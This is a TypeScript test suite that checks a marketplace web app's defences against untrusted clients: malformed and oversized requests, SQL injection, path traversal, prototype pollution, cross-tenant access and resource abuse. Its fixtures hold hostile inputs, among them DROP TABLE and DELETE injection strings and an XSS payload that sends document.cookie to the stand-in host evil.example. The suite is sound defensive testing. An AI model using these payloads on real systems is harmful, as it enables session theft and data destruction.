/**
 * Adversarial suite. Each test models a specific attack an untrusted client
 * could attempt against the service layer or the API plumbing.
 */
import { describe, expect, it } from "vitest";

import { prisma } from "@/lib/db";
import { AppError } from "@/lib/errors";
import { readJson } from "@/lib/api";
import { devLoginEnabled } from "@/lib/auth";
import {
  createMachine,
  createAvailabilitySlot,
  bookAvailabilitySlot,
  listAvailability,
} from "@/lib/services/inventory";
import {
  createPrintRequest,
  getConversation,
  startConversation,
} from "@/lib/services/messaging";
import { upsertOwnProfile, getPublicProfileBySlug } from "@/lib/services/profiles";
import { parseSearchParams, searchProfiles } from "@/lib/services/search";
import {
  createProviderWithInventory,
  createUser,
  futureDate,
  validMachineInput,
  validProfileInput,
} from "../setup/factories";

function jsonRequest(body: string, headers: Record<string, string> = {}) {
  return new Request("http://localhost/api/test", {
    method: "POST",
    headers: { "content-type": "application/json", ...headers },
    body,
  });
}

describe("API request parsing", () => {
  it("rejects a non-JSON content type", async () => {
    const request = new Request("http://localhost/api/test", {
      method: "POST",
      headers: { "content-type": "text/plain" },
      body: "hello",
    });
    await expect(readJson(request)).rejects.toMatchObject({ status: 415 });
  });

  it("rejects malformed JSON", async () => {
    await expect(readJson(jsonRequest("{ not json"))).rejects.toMatchObject({ status: 400 });
  });

  it("rejects an oversized body", async () => {
    const huge = JSON.stringify({ body: "x".repeat(70_000) });
    await expect(readJson(jsonRequest(huge))).rejects.toMatchObject({ status: 413 });
  });

  it("rejects an oversized declared content-length even when the body is small", async () => {
    await expect(
      readJson(jsonRequest("{}", { "content-length": String(10 * 1024 * 1024) })),
    ).rejects.toMatchObject({ status: 413 });
  });

  it("treats an empty body as an empty object", async () => {
    await expect(readJson(jsonRequest(""))).resolves.toEqual({});
  });

  it("never leaks internals for an unexpected error", () => {
    const error = new AppError("Boom", 500, "INTERNAL");
    expect(error.message).toBe("Boom");
    expect(error.status).toBe(500);
  });
});

describe("auth hardening", () => {
  it("keeps the credentials test-login disabled unless explicitly enabled", () => {
    const previous = process.env.ENABLE_DEV_LOGIN;
    process.env.ENABLE_DEV_LOGIN = "false";
    expect(devLoginEnabled()).toBe(false);
    process.env.ENABLE_DEV_LOGIN = previous;
  });

  it("exposes no credentials provider when the flag is unset", () => {
    const previous = process.env.ENABLE_DEV_LOGIN;
    delete process.env.ENABLE_DEV_LOGIN;
    expect(devLoginEnabled()).toBe(false);
    process.env.ENABLE_DEV_LOGIN = previous;
  });
});

describe("injection attempts", () => {
  it("stores SQL metacharacters as literal profile text", async () => {
    const user = await createUser();
    const profile = await upsertOwnProfile(
      user.id,
      validProfileInput({
        slug: "sql-test",
        displayName: "Robert'); DROP TABLE Profile;--",
      }),
    );

    expect(profile.displayName).toBe("Robert'); DROP TABLE Profile;--");
    expect(await prisma.profile.count()).toBe(1);
  });

  it("does not execute SQL through a search query", async () => {
    await createProviderWithInventory({ slug: "safe-shop" });
    const result = await searchProfiles(
      parseSearchParams({ q: "%'; DELETE FROM Profile WHERE '1'='1" }),
    );

    expect(result.items).toHaveLength(0);
    expect(await prisma.profile.count()).toBe(1);
  });

  it("stores XSS payloads verbatim so React escapes them at render time", async () => {
    const user = await createUser();
    const payload = '<script>fetch("//evil.example?c="+document.cookie)</script>';
    const profile = await upsertOwnProfile(
      user.id,
      validProfileInput({ slug: "xss-test", bio: payload }),
    );
    expect(profile.bio).toBe(payload);
  });

  it("strips control characters and null bytes from text fields", async () => {
    const user = await createUser();
    const profile = await upsertOwnProfile(
      user.id,
      validProfileInput({ slug: "ctrl-test", displayName: "Ada\u0000\u0007 Prints" }),
    );
    expect(profile.displayName).toBe("Ada Prints");
  });

  it("sanitises control characters in a slug without letting them bypass rules", async () => {
    const user = await createUser();

    // Control characters are stripped, then validated — so the stored slug is
    // always safe and can never smuggle a null byte into a URL.
    const profile = await upsertOwnProfile(
      user.id,
      validProfileInput({ slug: "ada\u0000admin" }),
    );
    expect(profile.slug).toBe("adaadmin");
    expect(profile.slug).not.toContain("\u0000");

    // Sanitising happens before the reserved-handle check, so this cannot be
    // used to claim a reserved handle.
    const other = await createUser();
    await expect(
      upsertOwnProfile(other.id, validProfileInput({ slug: "adm\u0000in" })),
    ).rejects.toThrow();
  });

  it("rejects a slug containing path traversal", async () => {
    const user = await createUser();
    await expect(
      upsertOwnProfile(user.id, validProfileInput({ slug: "../admin" })),
    ).rejects.toThrow();
    await expect(
      upsertOwnProfile(user.id, validProfileInput({ slug: "a/../../b" })),
    ).rejects.toThrow();
  });

  it("does not resolve a traversal-style slug to a real profile", async () => {
    await createProviderWithInventory({ slug: "real-shop" });
    expect(await getPublicProfileBySlug("../real-shop")).toBeNull();
    expect(await getPublicProfileBySlug("%2e%2e%2freal-shop")).toBeNull();
  });
});

describe("prototype pollution", () => {
  it("ignores __proto__ in a profile payload", async () => {
    const user = await createUser();
    const payload = JSON.parse(
      JSON.stringify({ ...validProfileInput({ slug: "proto-test" }), __proto__: { polluted: true } }),
    );

    await upsertOwnProfile(user.id, payload);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it("ignores constructor payloads in a machine input", async () => {
    const { user } = await createProviderWithInventory();
    const payload = JSON.parse(
      JSON.stringify({ ...validMachineInput(), constructor: { prototype: { hacked: true } } }),
    );

    await expect(createMachine(user.id, payload)).rejects.toThrow();
    expect(({} as Record<string, unknown>).hacked).toBeUndefined();
  });
});

describe("cross-tenant isolation", () => {
  it("does not let a forged profileId redirect a machine to another provider", async () => {
    const victim = await createProviderWithInventory();
    const attacker = await createProviderWithInventory();

    await expect(
      createMachine(attacker.user.id, {
        ...validMachineInput(),
        profileId: victim.profile.id,
      }),
    ).rejects.toThrow();

    expect(await prisma.machine.count({ where: { profileId: victim.profile.id } })).toBe(1);
  });

  it("scopes availability listings to a single profile", async () => {
    const first = await createProviderWithInventory();
    const second = await createProviderWithInventory();

    await createAvailabilitySlot(first.user.id, {
      startsAt: futureDate(2),
      endsAt: futureDate(2.1),
    });
    await createAvailabilitySlot(second.user.id, {
      startsAt: futureDate(2),
      endsAt: futureDate(2.1),
    });

    const slots = await listAvailability(first.profile.id);
    expect(slots).toHaveLength(1);
    expect(slots[0].profileId).toBe(first.profile.id);
  });

  it("keeps conversation ids unguessable across tenants", async () => {
    const provider = await createProviderWithInventory({ slug: "enum-shop" });
    const customer = await createUser();
    const conversation = await startConversation(customer.id, {
      profileSlug: "enum-shop",
      subject: "Hi",
      message: "Hello",
    });

    const attacker = await createUser();
    await expect(getConversation(attacker.id, conversation.id)).rejects.toMatchObject({
      status: 404,
    });
    // The provider (a legitimate participant) still has access.
    await expect(getConversation(provider.user.id, conversation.id)).resolves.toBeTruthy();
  });

  it("rejects a request referencing another provider's inventory", async () => {
    const target = await createProviderWithInventory({ slug: "target-shop" });
    const other = await createProviderWithInventory({ slug: "other-shop" });
    const customer = await createUser();

    await expect(
      createPrintRequest(customer.id, {
        profileSlug: "target-shop",
        title: "Cross-tenant probe",
        description: "Trying to reference another shop's machine.",
        machineId: other.machine.id,
      }),
    ).rejects.toThrow();

    expect(target.machine.id).not.toBe(other.machine.id);
    expect(await prisma.printRequest.count()).toBe(0);
  });
});

describe("resource exhaustion and abuse", () => {
  it("caps directory page size", async () => {
    const params = parseSearchParams({ perPage: "100000" });
    expect(params.perPage).toBeLessThanOrEqual(48);
  });

  it("caps machine quantity", async () => {
    const { user } = await createProviderWithInventory();
    await expect(
      createMachine(user.id, validMachineInput({ quantity: 10_000_000 })),
    ).rejects.toThrow();
  });

  it("rejects an absurdly long bio", async () => {
    const user = await createUser();
    await expect(
      upsertOwnProfile(user.id, validProfileInput({ slug: "long-bio", bio: "x".repeat(50_000) })),
    ).rejects.toThrow();
  });

  it("only one of two concurrent bookings wins", async () => {
    const provider = await createProviderWithInventory();
    const first = await createUser();
    const second = await createUser();
    const slot = await createAvailabilitySlot(provider.user.id, {
      startsAt: futureDate(12),
      endsAt: futureDate(12.2),
    });

    const results = await Promise.allSettled([
      bookAvailabilitySlot(first.id, slot.id),
      bookAvailabilitySlot(second.id, slot.id),
    ]);

    const fulfilled = results.filter((result) => result.status === "fulfilled");
    expect(fulfilled).toHaveLength(1);

    const finalSlot = await prisma.availabilitySlot.findUniqueOrThrow({ where: { id: slot.id } });
    expect(finalSlot.status).toBe("BOOKED");
    expect([first.id, second.id]).toContain(finalSlot.bookedByUserId);
  });
});

describe("data lifecycle", () => {
  it("cascades inventory deletion when a profile is removed", async () => {
    const { profile } = await createProviderWithInventory();
    await prisma.profile.delete({ where: { id: profile.id } });

    expect(await prisma.machine.count({ where: { profileId: profile.id } })).toBe(0);
    expect(await prisma.material.count({ where: { profileId: profile.id } })).toBe(0);
  });

  it("cascades messages when a conversation is removed", async () => {
    await createProviderWithInventory({ slug: "lifecycle-shop" });
    const customer = await createUser();
    const conversation = await startConversation(customer.id, {
      profileSlug: "lifecycle-shop",
      subject: "Hi",
      message: "Hello",
    });

    await prisma.conversation.delete({ where: { id: conversation.id } });
    expect(await prisma.message.count({ where: { conversationId: conversation.id } })).toBe(0);
  });
});
